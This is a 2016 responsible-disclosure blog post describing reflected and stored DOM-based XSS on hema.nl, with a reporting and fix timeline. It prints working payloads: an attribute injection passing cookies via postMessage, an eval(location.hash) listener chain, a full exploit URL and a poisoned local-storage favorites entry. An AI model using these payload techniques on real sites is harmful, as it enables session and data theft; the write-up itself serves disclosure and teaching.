<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="/css/template.css?version=2.0.1" /><link rel="shortcut icon" href="/img/favicon.svg?version=2.0.1" type="image/svg+xml" /> <script src="/js/template.js?version=2.0.1"></script><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: light)" /><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: dark)" /><title>Cross-site-scripting on one of the largest Dutch franchisors</title><meta property="og:title" content="Cross-site-scripting on one of the largest Dutch franchisors"><meta name="description" itemprop="description" content="By abusing a sensitive data exposure vulnerability it is possible to steal data from a Hema user. If the user is signed in, data like the user's name and email can be stolen using cross frame scripting. Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS."><meta property="og:description" content="By abusing a sensitive data exposure vulnerability it is possible to steal data from a Hema user. If the user is signed in, data like the user's name and email can be stolen using cross frame scripting. Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS."><meta name="keywords" content="xss, cross-site, scripting, hema, dutch, franchisor, dom, dom-based, sensitive, data, exposure"><meta name="language" content="english"><meta name="author" itemprop="creator" content="Tijme Gommers"><meta name="robots" content="index, follow"><meta name="distribution" content="global"><meta name="copyright" content="Copyright © 2024 Tijme Gommers. All rights reserved."><link rel="alternate" type="application/rss+xml" title="Atom" href="/feeds/atom.xml"></head><body><div class="navbar-wrapper mb-4"><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><nav class="navbar navbar-expand"><div class="collapse navbar-collapse"><ul class="navbar-nav me-auto"><li class="nav-item"> <a href="/" target="_self" class="nav-link"> <span>Posts</span> </a></li><li class="nav-item"> <a href="/about/" target="_self" class="nav-link"> <span>About</span> </a></li><li class="nav-item"> <a href="/donate/" target="_self" class="nav-link"> <span>Donate</span> </a></li></ul><ul class="navbar-nav"><li class="nav-item"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://www.linkedin.com/in/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://github.com/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="/feeds/atom.xml" target="_blank" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#rss"/></svg> </span></span> </a></li></ul></div></nav></div></div></div></div><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><article class="container-fluid"><h1 class="mb-2">Cross-site-scripting on one of the largest Dutch franchisors</h1><p class="mb-2 text-muted">Posted on <time datetime="2016-12-20T00:00:00+00:00">20 December 2016</time> by Tijme Gommers.</p><p>By abusing a sensitive data exposure <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener noreferrer">vulnerability</a> it is possible to steal data from a Hema user. If the user is signed in, data like the user’s name and email can be stolen using <a href="https://www.owasp.org/index.php/Cross_Frame_Scripting" target="_blank" rel="noopener noreferrer">cross frame scripting</a>. Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS.</p><blockquote><p>Please note that I used FireFox to test this vulnerability since browsers like Chrome, Safari and Edge have built in XSS auditors, which filter some of the reflected XSS.</p></blockquote><p><a href="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-auditor-block.png" target="_blank" rel="noopener noreferrer" data-lightbox="xss-auditor-block" data-title="Google Chrome's XSS auditor"><img src="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-auditor-block.png" title="Google Chrome's XSS auditor" alt="Google Chrome's XSS auditor" /></a></p><h3 id="proof-of-concept-reflected-xss">Proof of Concept (reflected XSS)</h3><p>While examining hema.nl I found some interesting XHR calls. One of them was <code class="language-plaintext highlighter-rouge">ListerQuickView.aspx</code>, which contained a lot of GET parameters.</p><p><code class="language-plaintext highlighter-rouge">http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&amp;nextProductId=pnl_60000199&amp;prevProductId=&amp;productId=pnl_60000198&amp;productSku=12345</code></p><p>I tried to inject JavaScript in all the parameters but it didn’t really work. Especially because they blocked all requests if the URL contained a <code class="language-plaintext highlighter-rouge">&lt;</code> sign followed by another character. The value of one of the parameters, <code class="language-plaintext highlighter-rouge">productSku</code>, was used as an attribute value. This made it possible to execute JavaScript using the <code class="language-plaintext highlighter-rouge">onmousemove</code> event. Unfortunately the <code class="language-plaintext highlighter-rouge">onload</code> event couldn’t be used since the element it got injected in was a div.</p><p>You can find the payload I used below. The inline CSS causes the div to overlap all content (this increases the chance that <code class="language-plaintext highlighter-rouge">onmousemove</code> is triggered). The <code class="language-plaintext highlighter-rouge">parent.postMessage</code> passes the cookie to the parent frame on mouse move.</p><p><code class="language-plaintext highlighter-rouge">&amp;productSku=tes" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="parent.postMessage(cookie, '*')"&gt;as</code></p><p>Which resulted in the following HTML:</p><p><a href="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-payload-in-source.jpg" target="_blank" rel="noopener noreferrer" data-lightbox="image-xss-payload" data-title="Payload in HTML"><img src="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-payload-in-source.jpg" title="Payload in HTML" alt="Payload in HTML" /></a></p><p>We can now place this piece of art in an iframe, which results in cross frame scripting.</p><h3 id="proof-of-concept-stored-dom-based-xss">Proof of Concept (Stored DOM-based XSS)</h3><p>Making it “Stored DOM-based XSS” is a bit more difficult. I divided it into two steps, bypassing the input restrictions and inserting the JavaScript payload into the local storage.</p><h4 id="bypassing-hemas-input-restrictions">Bypassing Hema’s input restrictions</h4><p>The DOM-based XSS vulnerability contains a little bit more code. Lets use the previous payload and edit it to look like this:</p><p><code class="language-plaintext highlighter-rouge">data-message="message" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="eval(location.hash.substring(1))"</code></p><p>This code executes the JavaScript from the <code class="language-plaintext highlighter-rouge">location.hash</code>. I used <code class="language-plaintext highlighter-rouge">location.hash</code> since hema.nl blocks a lot of characters, like <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">{</code>, and the <code class="language-plaintext highlighter-rouge">location.hash</code> will not be included in the request, so hema.nl will never know about it.</p><p>In my location hash I wrote <code class="language-plaintext highlighter-rouge">#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)})</code>.</p><p>I use <code class="language-plaintext highlighter-rouge">arguments[0].originalTarget.attributes[4].value</code> (where <code class="language-plaintext highlighter-rouge">arguments[0]</code> is the <code class="language-plaintext highlighter-rouge">onmousemove</code> event) to get the value of the fourth attribute of our div, which is the string <code class="language-plaintext highlighter-rouge">message</code>. I couldn’t just add the string <code class="language-plaintext highlighter-rouge">"message"</code> to <code class="language-plaintext highlighter-rouge">addEventListener</code> since quotes in the hash are converted to <code class="language-plaintext highlighter-rouge">%22</code>, which results in an unexpected <code class="language-plaintext highlighter-rouge">%</code> character.</p><p>So all this code basically sets a listener for messages on mouse move. Using cross frame scripting we can now execute all the code we want in the hema.nl iframe using <code class="language-plaintext highlighter-rouge">postMessage</code>.</p><p><code class="language-plaintext highlighter-rouge">document.getElementById('hema').contentWindow.postMessage('alert(document.cookie)', '*')</code></p><p>Which results in:</p><p><a href="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-alert-cookie.png" target="_blank" rel="noopener noreferrer" data-lightbox="image-alert-cookie" data-title="Alert on mouse over"><img src="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-alert-cookie.png" title="Alert on mouse over" alt="Alert on mouse over" /></a></p><p>This is the full URL that I used:</p><p><code class="language-plaintext highlighter-rouge">http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&amp;nextProductId=pnl_60000199&amp;prevProductId=&amp;productId=pnl_60000198&amp;productSku=tes%22%20data-message=%22message%22%20style=%22width:100%;height:100%;position:absolute;top:0;left:0;%22%20onmousemove=%22eval(location.hash.substring(1))%22%20data-test=%22as#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)});</code></p><h4 id="making-it-stored-dom-based-xss">Making it “Stored DOM-based XSS”</h4><p>Hema stores some interesting JSON in the local storage. For example, they store all the products that I added to my favorites.</p><p>A product that I added to my favorites looks like this:</p><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="w">
        </span><span class="nl">"imgUrl"</span><span class="p">:</span><span class="s2">"https://images.hema.nl/products/mok-60000198-normal.jpg"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"imgUrlX2"</span><span class="p">:</span><span class="s2">"https://images.hema.nl/products/mok-60000198-normal_twox.jpg"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"mok"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"productId"</span><span class="p">:</span><span class="s2">"pnl_60000198"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"price"</span><span class="p">:</span><span class="s2">"3,-"</span><span class="p">,</span><span class="w">
</span><span class="p">}</span></code></pre></figure><p>And ofcourse, using our postMessage, we can edit it so it looks like this (note the <code class="language-plaintext highlighter-rouge">onload</code> in the imgUrl):</p><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="w">
        </span><span class="nl">"imgUrl"</span><span class="p">:</span><span class="s2">"https://images.hema.nl/products/mok-60000198-normal.jpg</span><span class="se">\"</span><span class="s2"> onload=</span><span class="se">\"</span><span class="s2">alert(document.cookie)"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"imgUrlX2"</span><span class="p">:</span><span class="s2">"https://images.hema.nl/products/mok-60000198-normal_twox.jpg"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"mok"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"productId"</span><span class="p">:</span><span class="s2">"pnl_60000198"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"price"</span><span class="p">:</span><span class="s2">"3,-"</span><span class="p">,</span><span class="w">
</span><span class="p">}</span></code></pre></figure><p>Hema loads the favorites and shows the image without encoding the URL. Which means every time the victim navigates to hema.nl an alert will pop up.</p><p>So there you go, Stored DOM-based XSS!</p><p><a href="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-stored-proof.png" target="_blank" rel="noopener noreferrer" data-lightbox="image-stored-dom-based-xss-alert-cookie" data-title="Stored DOM-based XSS in hema.nl"><img src="/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-stored-proof.png" title="Stored DOM-based XSS in hema.nl" alt="Stored DOM-based XSS in hema.nl" /></a></p><h3 id="domains">Domains</h3><p><a href="http://www.hema.nl/" target="_blank" rel="noopener">www.hema.nl</a> (vulnerable) <br /> <a href="http://www.hema.fr/" target="_blank" rel="noopener"><s>www.hema.fr</s></a> (protected by CloudFlare) <br /> <a href="http://www.hema.be/" target="_blank" rel="noopener"><s>www.hema.be</s></a> (not vulnerable) <br /> <a href="http://www.hemashop.com/" target="_blank" rel="noopener"><s>www.hemashop.com</s></a> (not vulnerable)</p><h3 id="timeline">Timeline</h3><div class="table-responsive"><table class="table"><thead><tr><th>Date</th><th>Activity</th></tr></thead><tbody><tr><td>11 Dec 2016 18:43:34 GMT</td><td>Reported the vulnerability to Hema.</td></tr><tr><td>12 Dec 2016 09:23:21 GMT</td><td>Hema is investigating the vulnerability.</td></tr><tr><td>15 Dec 2016 13:54:56 GMT</td><td>Hema confirmed the vulnerability.<br />Hema will be releasing a fix in week 51.</td></tr><tr><td>20 Dec 2016 19:11:44 GMT</td><td>Hema fixed the vulnerability.</td></tr><tr><td>20 Dec 2016 19:14:41 GMT</td><td>Public disclosure.</td></tr></tbody></table></div></article><footer class="text-center mt-5 mb-5"><div class="footer-links"> <a href="/"><span>Posts</span></a> <a href="/about/" target="_self"><span>About</span></a> <a href="/donate/" target="_self"><span>Donate</span></a> <a href="/responsible-disclosure/" target="_self"><span>Responsible Disclosure</span></a></div><p class="footer-copyright text-secondary"> Copyright &copy; 2024 Tijme Gommers. All rights reserved.</p><div class="footer-icons"><div class="padding"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></div><div class="padding"> <a href="https://github.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></div><div class="padding"> <a href="https://www.linkedin.com/in/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></div></div></footer></div></div></div></body></html>
